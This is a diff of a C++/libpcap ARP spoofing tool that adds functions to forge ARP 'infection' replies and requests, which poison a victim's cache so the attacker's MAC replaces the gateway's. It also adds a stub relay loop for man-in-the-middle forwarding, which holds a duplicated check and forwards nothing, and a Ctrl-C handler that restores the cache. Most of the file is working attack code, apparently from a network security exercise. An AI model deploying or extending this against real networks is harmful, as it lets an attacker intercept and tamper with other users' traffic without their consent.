@@ -1,6 +1,6 @@
 #include "arp-spoof.h"
 
-void MakeEthArpPkt(EthArpPacket* lp_arp_pkt, Mac eth_dmac, Mac eth_smac, Mac arp_tmac , Ip arp_tip, Mac arp_smac, Ip arp_sip ,int type){
+void MakeEthArpPkt(EthArpPacket* lp_arp_pkt, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip , Mac arp_tmac , Ip arp_tip, int type){
     // arp packet for arp request
     // eth_dmac : broadcast
     lp_arp_pkt->eth_.dmac_ = eth_dmac;
@@ -71,10 +71,11 @@ Mac GetMacfromIp(pcap_t* handle, Ip tip){
     // std::cout << "My        IP  :" << std::string(myIp) << "\n";
     
     // arp packet for arp request
-    // eth_dmac : broadcast, arp_tmac : unknown
+    // eth: myMac -> broadcast
+    // arp: myMac, myIp -> unknown mac, tip
     // arp request
-    MakeEthArpPkt(&arp_pkt, Mac("FF:FF:FF:FF:FF:FF"), myMac,
-                    Mac("00:00:00:00:00:00"), tip, myMac, myIp, ARP_REQ_TYPE);
+    MakeEthArpPkt(&arp_pkt, myMac, Mac("FF:FF:FF:FF:FF:FF"),
+                    myMac, myIp, Mac("00:00:00:00:00:00"), tip, ARP_REQ_TYPE);
     
     std::thread t1([](pcap_t* handle, EthArpPacket* lparp_pkt){
         int cnt = 0;
@@ -94,10 +95,9 @@ Mac GetMacfromIp(pcap_t* handle, Ip tip){
         }
     }, handle, &arp_pkt);
     
-
+    
     std::thread t2([](pcap_t* handle, Ip tip){
         // receive packet
-        int cnt = 0;
         while (true){
             pcap_pkthdr* header;
             const u_char* recv_packet;
@@ -109,7 +109,11 @@ Mac GetMacfromIp(pcap_t* handle, Ip tip){
                 break;
             }
             
-            EthArpPacket* _recv_packet =(EthArpPacket*) recv_packet;
+            // if receive packet is 
+            // 1. ARP packet
+            // 2. Reply
+            // 3. source ip == tip
+            EthArpPacket* _recv_packet = (EthArpPacket*) recv_packet;
             if (_recv_packet->eth_.type() == EthHdr::Arp){
                 if (_recv_packet->arp_.op() == ArpHdr::Reply && _recv_packet->arp_.sip() == tip){
                     tmac = _recv_packet->arp_.smac();
@@ -127,6 +131,80 @@ Mac GetMacfromIp(pcap_t* handle, Ip tip){
 }
 
 
-bool ArpInfection( Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac, int type){
+bool SendArpInfectPkt(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, int type){
+    EthArpPacket arp_pkt;
+
+    // arp infection packet type ** Reply **
+    // ethernet : my_mac -> sender_mac
+    // arp : (my_mac, target_ip) -> (sender_mac, sender_ip) : target_ip is me! (my_mac)
+    if(type == ARP_REP_TYPE) MakeEthArpPkt(&arp_pkt, myMac, sender_mac, myMac, target_ip, sender_mac, sender_ip, ARP_REP_TYPE);
+
+    // arp infection packet type ** Request **
+    // ethernet : my_mac -> sender_mac
+    // arp : (my_mac, target_ip) -> (unknown, sender_ip) : target_ip is me(my_mac) and who is sender_ip? 
+    else if (type == ARP_REQ_TYPE) MakeEthArpPkt(&arp_pkt, myMac, sender_mac, myMac, target_ip, Mac("00:00:00:00:00:00"), sender_ip, ARP_REQ_TYPE);
+
+    // send arp packet
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
     return true;
+}
+
+bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
+
+    while (true)
+    {
+        pcap_pkthdr* header;
+        const u_char* recv_packet; // Too many Stack Memory?
+        
+        int res = pcap_next_ex(handle, &header, &recv_packet);
+        if (res == 0) continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+
+        // if receive packet is 
+        // 0. ip packet
+        // 1. from sender
+        // 2. to gateway
+        EthIpPacket* _recv_packet = (EthIpPacket*) recv_packet;
+        if (_recv_packet->eth_.type() == EthHdr::Ip4){
+            if (_recv_packet->ip_.sip == sender_ip && _recv_packet->ip_.dip ==  target_ip ){
+                
+                break;
+            }
+        }
+
+        if (_recv_packet->eth_.type() == EthHdr::Ip4){
+            if (_recv_packet->ip_.sip == sender_ip && _recv_packet->ip_.dip ==  target_ip ){
+                break;
+            }
+        }   
+    }
+
+    return true;
+}
+
+void SigINTHandler(int sig){
+    
+    EthArpPacket arp_pkt;
+    printf("\n");
+    
+    // arp infection packet type ** Reply **
+    // ethernet : my_mac -> sender_mac
+    // arp : (target_mac, target_ip) -> (sender_mac, sender_ip) : target_ip is target_mac!
+    MakeEthArpPkt(&arp_pkt, myMac, sender_mac, target_mac, target_ip, sender_mac, sender_ip, ARP_REP_TYPE);
+
+    // send arp packet
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
+    printf("\nARP-spoofing DONE!\n");
+    exit(1);
 }
